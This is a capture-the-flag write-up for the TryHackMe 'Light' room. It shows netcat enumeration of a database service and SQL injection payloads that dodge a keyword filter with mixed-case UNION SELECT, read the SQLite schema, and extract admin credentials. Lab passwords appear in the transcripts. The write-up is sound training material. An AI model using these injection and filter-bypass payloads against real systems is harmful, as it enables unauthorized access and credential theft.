# TRYHACKME : Light

*I am working on a database application called Light! Would you like to try it out?
If so, the application is running on port 1337. You can connect to it using nc <TARGET-IP> 1337
You can use the username smokey in order to get started.*

## NMAP
```
$ nmap -sV -T4 -p- -v 10.10.241.223 
...
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
1337/tcp open  waste?
...
```

## NETCAT
```
$ nc 10.10.241.223 1337
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: john
Password: e74tqwRh2oApPo6
Please enter your username: administrator
Username not found.
Please enter your username: admin
Username not found.
Please enter your username: blake
Username not found.
Please enter your username: joe
Username not found.
Please enter your username: alice
Password: tF8tj2o94WE4LKC
Please enter your username: 
```
It contains stored password to stored usernames. We need to find the admin's account.

## SSH
```
$ ssh smokey@10.10.241.223 
The authenticity of host '10.10.241.223 (10.10.241.223)' can't be established.
ED25519 key fingerprint is SHA256:BD7uZfA2E7FwfzJpcn+1aMFE4APLItRTSrsiUHImRz4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.241.223' (ED25519) to the list of known hosts.
smokey@10.10.241.223's password: 
Permission denied, please try again.
```
The credentials for Smokey doesnt work in the ssh.

## NETCAT
Back to netcat. We'll try some SQL injection to the database:
```
$ nc 10.10.241.223 1337
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: ' OR 1=1 --
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
Please enter your username: smokey' OR password LIKE 's%     
Password: vYQ5ngPpw8AdUmL
Please enter your username: ' UniOn SeLeCt sqlite_version() '
Password: 3.31.1
Please enter your username: ' UNioN SeLeCT sql FROM sqlite_master '
Password: CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
Please enter your username: ' UniOn SeLeCt group_concat(sql) FROM sqlite_master '
]Password: CREATE TABLE usertable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER),CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
Please enter your username: ' UNioN SeLeCT username FROM admintable WHERE id=1 OR '
Password: // RETRIEVE USERNAME
Please enter your username: ' UNioN SeLeCT password FROM admintable WHERE id=1 OR '
Password: // RETRIEVE PASSWORD
Please enter your username: ' UNioN SeLeCT password FROM admintable WHERE id=1 OR '
Password: // RETRIEVE FLAG

```
